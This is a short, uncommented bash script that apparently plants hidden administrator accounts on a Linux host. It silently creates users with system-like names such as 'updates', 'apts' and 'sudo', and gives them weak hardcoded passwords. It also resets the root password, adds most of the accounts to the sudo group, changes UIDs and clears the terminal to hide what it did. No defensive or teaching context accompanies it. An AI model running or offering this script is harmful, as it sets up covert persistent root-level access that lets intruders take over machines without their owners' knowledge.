#!/bin/bash

useradd  -m   -s /bin/bash admins > /dev/null 2>&1
useradd  -m   -s /bin/bash essentials > /dev/null 2>&1
useradd  -m   -s /bin/bash root > /dev/null 2>&1
useradd  -m   -s /bin/bash sudo > /dev/null 2>&1
useradd  -m   -s /bin/bash ubuntu > /dev/null 2>&1
useradd  -m   -s /bin/bash updates > /dev/null 2>&1
useradd  -m   -s /bin/bash apts > /dev/null 2>&1

printf "stems\nstems" | sudo passwd admins  > /dev/null 2>&1
printf "stems\nstems" | sudo passwd ubuntu > /dev/null 2>&1
printf "essentials\nessentials" | sudo passwd essentials > /dev/null 2>&1
printf "piroz\npiroz" | sudo passwd root > /dev/null 2>&1
printf "sudos\nsudos" | sudo passwd sudo > /dev/null 2>&1
printf "updates\nupdates" | sudo passwd updates > /dev/null 2>&1
printf "apt\napt" | sudo passwd apts > /dev/null 2>&1


usermod -aG sudo essentials
usermod -aG sudo root
usermod -aG sudo sudo
usermod -aG sudo updates
usermod -aG sudo apts
usermod -aG sudo admins

sudo usermod -u 560 essentials
sudo usermod -u 561 root
sudo usermod -u 562 sudo
sudo usermod -u 563 updates
sudo usermod -u 564 apts
sudo usermod -u 565 console
sudo usermod -u 568 admins




usermod -u 563 updates
usermod -u 568 admins


clear
